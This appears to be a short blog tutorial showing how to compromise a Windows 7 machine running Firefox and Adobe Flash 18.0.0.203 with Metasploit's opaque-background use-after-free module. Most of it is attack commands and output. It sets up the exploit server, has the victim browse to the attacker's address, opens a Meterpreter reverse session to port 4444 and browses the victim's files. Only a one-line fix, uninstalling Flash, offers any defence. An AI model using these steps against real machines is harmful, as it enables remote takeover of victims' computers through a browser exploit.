Metasploit Adobe Flash 18.0.0.203 Exploit – Windows 7 / Windows 8.1
**Attacker:** Kali Linux<br>
**Victim:** Windows 7 Enterprise 32-bit (Adobe Flashplayer 18.0.0.203, Firefox 39)
##Step 1 – Starting the Exploit Server
Run msfconsole, load adobe-flash-opaque-background-uaf and set all required options.
<code>
<div class="code">
root@kali:~$ <com>msfconsole</com><br>
msf > <com>use exploit/multi/browser/adobe_flash_opaque_background_uaf</com><br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>set SRVPORT 80</com><br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>set URIPATH /</com><br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>exploit</com><br>
[*] Local IP: http://192.168.1.12:80/<br>
[*] Server started.<br>
</div>
</code>

##Step 2 – Exploiting the Victim Machine
On your Windows test machine (victim), start Firefox and browse to http://192.168.1.12.<br>
This will trigger the adobe-flash-opaque-background-uaf exploit and launch a meterpreter session.<br>
<code>
<div class="code">
[*] 192.168.1.11 adobe_flash_opaque_background_uaf - Sending SWF...<br>
[*] Sending stage (885806 bytes) to 192.168.1.11<br>
[*] Meterpreter session 1 opened (192.168.1.12:4444 -> 192.168.1.11:49297) at 2015-08-01 04:39:34 -0400<br>
msf exploit(adobe_flash_opaque_background_uaf) > <com>sessions -i 1</com><br>
[*] Starting interaction with 1...<br>
<br>
meterpreter > <com>getuid</com><br>
Server username: IE8Win7\IEUser<br>
meterpreter > <com>ls</com><br>
Listing: C:\<br>
============<br>
<br>
Mode Size Type Last modified Name<br>
---- ---- ---- ------------- ----<br>
40777/rwxrwxrwx 0 dir 2013-10-23 12:22:56 -0400 $Recycle.Bin<br>
40777/rwxrwxrwx 0 dir 2009-07-14 00:53:55 -0400 Documents and Settings<br>
40777/rwxrwxrwx 0 dir 2009-07-13 22:37:05 -0400 PerfLogs<br>
40555/r-xr-xr-x 0 dir 2015-08-01 03:32:42 -0400 Program Files<br>
40777/rwxrwxrwx 0 dir 2015-08-01 03:32:42 -0400 ProgramData<br>
40777/rwxrwxrwx 0 dir 2013-10-23 12:22:42 -0400 Recovery<br>
40777/rwxrwxrwx 0 dir 2014-11-26 14:57:05 -0500 System Volume Information<br>
40555/r-xr-xr-x 0 dir 2013-10-23 12:22:47 -0400 Users<br>
40777/rwxrwxrwx 0 dir 2013-10-23 17:52:20 -0400 Wallpaper<br>
40777/rwxrwxrwx 0 dir 2015-08-01 03:20:08 -0400 Windows<br>
100777/rwxrwxrwx 24 fil 2009-06-10 17:42:20 -0400 autoexec.bat<br>
100666/rw-rw-rw- 10 fil 2009-06-10 17:42:20 -0400 config.sys<br>
100666/rw-rw-rw- 1073741824 fil 2015-08-01 04:01:24 -0400 pagefile.sys<br>
</div>
</code>
##Solution
Uninstall flashplayer.

Tags: metasploit
